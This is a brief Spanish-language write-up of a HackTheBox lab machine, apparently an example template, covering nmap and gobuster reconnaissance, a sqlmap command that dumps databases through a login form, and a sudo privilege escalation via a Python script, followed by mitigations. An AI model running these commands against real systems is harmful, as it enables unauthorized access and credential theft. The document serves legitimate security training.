---
title: "Writeup - VM Ejemplo: Banky"
date: "2025-10-01"
platform: "HackTheBox"
difficulty: "medio"
tags: ["web","sql-injection","nmap"]
slug: "banky-hackthebox"
hours_spent: 5
---

# Writeup - VM Ejemplo: Banky

**Fecha:** 2025-10-01 • **Plataforma:** HackTheBox • **Dificultad:** medio • **Horas:** 5

## TL;DR
Explotación de SQL injection para obtener acceso administrativo y posterior escalada de privilegios mediante vulnerabilidad de sudo.

## Entorno
VM local de HackTheBox. **REDACTADO** cualquier IP real o credencial.

## Reconocimiento
```bash
nmap -sC -sV 10.10.10.100
```
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1
80/tcp open  http    Apache httpd 2.4.29
```
```bash
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
```
Se descubrió panel de login en /admin.

## Explotación (laboratorio)
Uso de sqlmap para identificar y explotar vulnerabilidad SQLi:
```bash
sqlmap -u "http://10.10.10.100/login.php" --data="username=admin&password=test" --dbs
```
Se extrajeron credenciales de la base de datos.

## Post-explotación
Obtención de shell reverso y escalada mediante vulnerabilidad de sudo:
```bash
sudo -l
sudo /usr/bin/python3 /opt/scripts/backup.py
```
## Limpieza y mitigaciones
Validación de entrada en formularios

Uso de prepared statements

Actualización del sistema

Restricción de permisos sudo

## Lecciones aprendidas
Importancia de la validación de entrada y el principio de mínimo privilegio. Referencia: OWASP SQL Injection Prevention Cheat Sheet.
